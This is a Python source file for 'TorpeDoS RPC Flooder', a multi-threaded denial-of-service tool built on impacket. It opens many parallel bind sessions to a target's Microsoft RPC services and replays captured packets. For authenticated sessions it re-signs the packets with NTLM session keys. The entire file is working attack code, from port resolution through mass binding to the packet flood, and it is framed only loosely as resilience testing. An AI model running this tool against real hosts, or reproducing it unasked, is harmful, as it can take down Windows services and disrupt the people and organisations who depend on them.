#!/usr/bin/env python3
"""
TorpeDoS RPC Flooder - Multi-threaded MSRPC Replay Attack Tool

This tool performs high-volume replay attacks against Microsoft RPC (MSRPC) services by sending pre-captured packet dumps to a target host. It supports both authenticated (NTLM) and unauthenticated sessions, enabling flexible testing of RPC service resilience and DoS conditions.

Usage:
    python main.py target_host [options]

Options:
    -u, --username USERNAME      Username for RPC authentication (optional)
    -p, --password PASSWORD      Password for RPC authentication (optional)
    -d, --domain DOMAIN          Domain for RPC authentication (optional)
    --packets-file FILE          Path to a file containing RPC packets to replay written as textual hexstreams separated by lines (required)
    --delay-between-iterations N Delay (seconds) between iterations (default: 30)
    -c, --replay-count N         Number of parallel bind sessions to open (required)
    --iterations N               Number of times to repeat the replay (default: 1)
    -w, --worker-count N         Number of threads to use in each stage (default: 16)

Example:
    python main.py 192.168.1.10 --packets-file packets.txt -c 10000 --iterations 4
"""
import argparse
import binascii
import threading
import time
import logging
from pathlib import Path
from queue import Queue, Empty
from tqdm import tqdm
from impacket import ntlm
from impacket.dcerpc.v5 import transport, epm
from impacket.uuid import uuidtup_to_bin
from impacket.dcerpc.v5.rpcrt import MSRPCBind, CtxItem, MSRPCHeader, MSRPC_BIND
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler('torpedos_rpc_flooder.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('TorpeDoS')

def parse_cli_arguments():
    """
    Parse command-line arguments for the TorpeDoS RPC flooder tool.

    Returns:
        argparse.Namespace: Parsed arguments containing target host, authentication details, packet file, concurrency, and iteration settings.
    """
    parser = argparse.ArgumentParser(
        description="TorpeDoS RPC Flooder - A tool for MSRPC replay attacks"
    )
    parser.add_argument("target_host", help="IP address or hostname of the RPC server")
    parser.add_argument("-u", "--username", required=False,
                        help="Username for RPC authentication (if required)")
    parser.add_argument("-p", "--password", required=False,
                        help="Password for RPC authentication (if required)")
    parser.add_argument("-d", "--domain", required=False,
                        help="Domain for RPC authentication (if required)")
    parser.add_argument(
        "--packets-file", required=True,
        help="Path to a file containing RPC packets as hex streams, one per line"
    )
    parser.add_argument(
        "--delay-between-iterations", required=False, default=30, type=int,
        help="Delay (in seconds) between iterations (default: 30)"
    )
    parser.add_argument(
        "-c", "--replay-count", type=int, required=True,
        help="Number of parallel bind sessions to establish"
    )
    parser.add_argument(
        "--iterations", type=int, default=1,
        help="Number of times to repeat the replay attack (default: 1)"
    )
    parser.add_argument(
        "-w", "--worker-count", type=int, default=16,
        help="Number of worker threads per stage (default: 16)"
    )
    args = parser.parse_args()
    logger.debug(f"Parsed arguments: target={args.target_host}, replay_count={args.replay_count}, iterations={args.iterations}, workers={args.worker_count}")
    return args

class CustomSigningDCERPC(transport.DCERPC_v5):
    """
    Extends impacket's DCERPC_v5 to provide access to NTLM signing parameters.
    """
    def get_sign_data(self):
        """
        Retrieve NTLM signing parameters (flags, signing key, sealing handle).

        Returns:
            tuple: (flags, clientSigningKey, clientSealingHandle)
        """
        return (
            self._DCERPC_v5__flags,
            self._DCERPC_v5__clientSigningKey,
            self._DCERPC_v5__clientSealingHandle
        )

def load_packet_file(file_path):
    """
    Load and parse an RPC packet dump from a textual hex dump file, extracting interface info, authentication requirement, and packet data.

    Args:
        file_path (pathlib.Path): Path to the .hex file containing packet data.

    Returns:
        tuple: (interface_descriptor (tuple[str, str]), requires_authentication (bool), packets (list[bytes]))

    Raises:
        ValueError: If UUID or VERSION headers are missing in the file.
    """
    logger.debug(f"Loading packet file: {file_path}")
    interface_uuid = None
    version = None
    requires_authentication = False
    packets = []

    for line in file_path.read_text().splitlines():
        if line.startswith("# UUID:"):
            interface_uuid = line.split(":", 1)[1].strip()
            logger.debug(f"Found UUID: {interface_uuid}")
        elif line.startswith("# VERSION:"):
            version = line.split(":", 1)[1].strip()
            logger.debug(f"Found version: {version}")
        elif line.startswith("# AUTH:"):
            requires_authentication = line.split(":", 1)[1].strip().lower() == "yes"
            logger.debug(f"Authentication required: {requires_authentication}")
        elif line and not line.startswith("#"):
            packets.append(binascii.a2b_hex(line.strip()))

    if not interface_uuid or not version:
        raise ValueError(f"Missing UUID or VERSION header in {file_path}")
    
    logger.debug(f"Loaded {len(packets)} packets from {file_path}")
    return (interface_uuid, version), requires_authentication, packets

def resolve_rpc_port(server_ip, interface_uuid_bin):
    """
    Resolve the TCP port for an RPC interface by querying the endpoint mapper (EPM).

    Args:
        server_ip (str): Target host IP or hostname.
        interface_uuid_bin (bytes): Binary UUID of the target interface.

    Returns:
        str or None: Resolved TCP port as a string, or None if resolution fails.
    """
    logger.debug(f"Resolving RPC port for {server_ip} with UUID {interface_uuid_bin.hex()}")
    rpc_transport = transport.DCERPCTransportFactory(f"ncacn_ip_tcp:{server_ip}[135]")
    dce = rpc_transport.get_dce_rpc()
    dce.connect()
    try:
        binding_string = epm.hept_map(
            server_ip, interface_uuid_bin, protocol='ncacn_ip_tcp'
        )
        port = binding_string.split("[")[1].rstrip("]")
        logger.debug(f"Resolved RPC port: {port}")
        return port
    except Exception as e:
        logger.error(f"Failed to resolve RPC port: {e}")
        return None
    finally:
        dce.disconnect()

def rpc_stateless_bind(dce, rpc_transport, iface_uuid):
    """
    Perform a stateless MSRPC bind without waiting for acknowledgment.

    Args:
        dce (DCERPC_v5): DCE/RPC connection object.
        rpc_transport: Transport object for the connection.
        iface_uuid (bytes): Binary UUID of the target interface.
    """
    logger.debug(f"Initiating stateless bind for interface UUID {iface_uuid.hex()}")
    bind = MSRPCBind()
    ctx = dce._ctx
    item = CtxItem()
    item['AbstractSyntax'] = iface_uuid
    item['TransferSyntax'] = uuidtup_to_bin(('8a885d04-1ceb-11c9-9fe8-08002b104860', '2.0'))
    item['ContextID'] = ctx
    item['TransItems'] = 1
    bind.addCtxItem(item)

    packet = MSRPCHeader()
    packet['type'] = MSRPC_BIND
    packet['pduData'] = bind.getData()
    packet['call_id'] = 1

    rpc_transport.send(packet.get_packet())
    logger.debug("Stateless bind packet sent")

def replay_packets_for_interface(
    server_ip, rpc_port, interface_info, packet_list,
    replay_count, worker_count, requires_authentication,
    packet_filename, username=None, password=None, domain=None
):
    """
    Orchestrate the replay of RPC packets to a target interface with multi-threaded session setup and packet sending.

    Args:
        server_ip (str): RPC server address.
        rpc_port (str): Resolved RPC TCP port.
        interface_info (tuple): (uuid_str, version_str).
        packet_list (list of bytes): Packets to replay.
        replay_count (int): Number of bind sessions to open.
        worker_count (int): Number of threads per stage.
        requires_authentication (bool): Whether NTLM signing is required.
        packet_filename (str): Name of the packet file for logging.
        username (str): Username for authentication (if required).
        password (str): Password for authentication (if required).
        domain (str): Domain for authentication (if required).
    """
    rpc_sessions = []  # List of (dce, transport) tuples
    signature_map = {}  # socket -> list of signature bytes
    logger.debug(f"Starting replay for interface {interface_info[0]}@v{interface_info[1]}, "
                f"auth={'yes' if requires_authentication else 'no'}, file={packet_filename}, "
                f"sessions={replay_count}, workers={worker_count}")

    def session_establishment_worker(task_queue, progress_bar, lock):
        """
        Worker thread to establish DCE/RPC sessions (binds) to the target interface.

        Args:
            task_queue (Queue): Queue of bind tasks.
            progress_bar (tqdm): Progress bar for tracking bind progress.
            lock (threading.Lock): Lock for thread-safe progress updates.
        """
        while True:
            try:
                task_queue.get_nowait()
            except Empty:
                return
            try:
                logger.debug(f"Establishing session to {server_ip}:{rpc_port}")
                rpc_transport = transport.DCERPCTransportFactory(
                    f"ncacn_ip_tcp:{server_ip}[{rpc_port}]"
                )
                dce = CustomSigningDCERPC(rpc_transport)
                dce.connect()

                if requires_authentication:
                    logger.debug(f"Setting credentials: {username}@{domain}")
                    rpc_transport.set_credentials(username, password, domain)
                    dce.set_auth_level(5)
                    dce.bind(uuidtup_to_bin(interface_info))
                    logger.debug("Authenticated bind completed")
                else:
                    rpc_stateless_bind(dce, rpc_transport, uuidtup_to_bin(interface_info))
                    logger.debug("Stateless bind completed")

                rpc_sessions.append((dce, rpc_transport))
            except Exception as err:
                logger.error(f"Bind failed: {err}")
            finally:
                with lock:
                    progress_bar.update(1)
                task_queue.task_done()

    def signature_generation_worker(task_queue, progress_bar, lock):
        """
        Worker thread to generate NTLM signatures for packets in each session.

        Args:
            task_queue (Queue): Queue of (dce, binder) session tuples.
            progress_bar (tqdm): Progress bar for tracking signature generation.
            lock (threading.Lock): Lock for thread-safe progress updates.
        """
        while True:
            try:
                dce, binder = task_queue.get_nowait()
            except Empty:
                return
            logger.debug(f"Generating signatures for session on socket {binder.get_socket()}")
            flags, signing_key, sealing_handle = dce.get_sign_data()
            signatures = []
            for index, packet in enumerate(packet_list):
                sig = ntlm.SIGN(
                    flags, signing_key,
                    packet[:-16], index, sealing_handle
                ).getData()
                signatures.append(sig)
            signature_map[binder.get_socket()] = signatures
            logger.debug(f"Generated {len(signatures)} signatures")
            with lock:
                progress_bar.update(1)
            task_queue.task_done()

    def rpc_call_worker(sig_map, task_queue, progress_bar, lock):
        """
        Worker thread to send RPC packets in a batch per socket, applying signatures if required.

        Args:
            sig_map (dict): Mapping of socket to list of signatures.
            task_queue (Queue): Queue of sockets to process.
            progress_bar (tqdm): Progress bar for tracking packet sending.
            lock (threading.Lock): Lock for thread-safe progress updates.
        """
        while True:
            try:
                sock = task_queue.get_nowait()
            except Empty:
                return
            logger.debug(f"Sending packets on socket {sock}")
            current_packet_list = packet_list
            if requires_authentication:
                current_packet_list = [
                    packet[:-16] + sig_map[sock][idx]
                    for idx, packet in enumerate(packet_list)
                ]
            try:
                sock.send(b"".join(current_packet_list))
                logger.debug(f"Successfully sent {len(current_packet_list)} packets")
            except Exception as err:
                logger.error(f"Failed to send packets: {err}")
            with lock:
                progress_bar.update(1)
            task_queue.task_done()

    def start_worker_threads(count, worker_fn, args):
        """
        Launch and join worker threads for a given worker function.

        Args:
            count (int): Number of threads to launch.
            worker_fn (callable): Worker function to execute.
            args (tuple): Arguments to pass to the worker function.
        """
        logger.debug(f"Starting {count} worker threads for {worker_fn.__name__}")
        threads = [
            threading.Thread(target=worker_fn, args=args, daemon=True)
            for _ in range(count)
        ]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()
        logger.debug(f"All {count} worker threads completed")

    # Stage 1: Establish sessions (bind)
    logger.debug("Stage 1: Establishing bind sessions")
    bind_queue = Queue()
    bind_lock = threading.Lock()
    for _ in range(replay_count):
        bind_queue.put(None)
    bind_bar = tqdm(total=replay_count, desc="Binding sessions")
    start_worker_threads(
        worker_count,
        session_establishment_worker,
        (bind_queue, bind_bar, bind_lock)
    )
    bind_bar.close()
    logger.debug(f"Established {len(rpc_sessions)} sessions")

    # Stage 2: Generate signatures (if needed)
    if requires_authentication:
        logger.debug("Stage 2: Generating NTLM signatures")
        sign_queue = Queue()
        sign_lock = threading.Lock()
        for session in rpc_sessions:
            sign_queue.put(session)
        sign_bar = tqdm(total=len(rpc_sessions), desc="Generating signatures")
        start_worker_threads(
            worker_count,
            signature_generation_worker,
            (sign_queue, sign_bar, sign_lock)
        )
        sign_bar.close()
        logger.debug(f"Generated signatures for {len(signature_map)} sessions")

    # Stage 3: Send RPC calls
    logger.debug("Stage 3: Sending RPC packets")
    call_queue = Queue()
    call_lock = threading.Lock()
    for _, rpc_transport in rpc_sessions:
        sock = rpc_transport.get_socket()
        call_queue.put(sock)
    call_bar = tqdm(total=len(rpc_sessions), desc="Sending packets")
    start_worker_threads(
        worker_count,
        rpc_call_worker,
        (signature_map, call_queue, call_bar, call_lock)
    )
    call_bar.close()
    logger.debug(f"Completed sending packets for {len(rpc_sessions)} sessions")

    # Cleanup: Disconnect sessions
    logger.debug("Cleaning up: Disconnecting sessions")
    for _, rpc_transport in rpc_sessions:
        try:
            rpc_transport.disconnect()
            logger.debug("Session disconnected")
        except Exception as e:
            logger.error(f"Failed to disconnect session: {e}")

def main():
    """
    Main entry point for the TorpeDoS RPC flooder tool. Coordinates argument parsing, packet loading, port resolution, and attack execution.
    """
    logger.debug("Starting TorpeDoS RPC Flooder")
    start_time = datetime.now()
    args = parse_cli_arguments()
    pkt_file = Path(args.packets_file)
    logger.debug(f"Packet file path: {pkt_file}")

    interface_info, requires_auth, packets = load_packet_file(pkt_file)
    if requires_auth and not (args.username and args.password and args.domain):
        raise ValueError(
            "Authentication required but credentials (username/password/domain) not provided."
        )

    rpc_port = resolve_rpc_port(
        args.target_host,
        uuidtup_to_bin(interface_info)
    )
    if not rpc_port:
        logger.error(f"Failed to resolve RPC port for interface {interface_info}")
        return

    for i in range(args.iterations):
        logger.debug(f"Starting iteration {i + 1}/{args.iterations}")
        replay_packets_for_interface(
            server_ip=args.target_host,
            username=args.username,
            password=args.password,
            domain=args.domain,
            rpc_port=rpc_port,
            interface_info=interface_info,
            packet_list=packets,
            replay_count=args.replay_count,
            worker_count=args.worker_count,
            requires_authentication=requires_auth,
            packet_filename=pkt_file.name
        )
        if i + 1 != args.iterations:
            logger.debug(f"Waiting {args.delay_between_iterations} seconds before next iteration")
            time.sleep(args.delay_between_iterations)

    end_time = datetime.now()
    logger.debug(f"Attack completed. Total duration: {end_time - start_time}")

if __name__ == "__main__":
    main()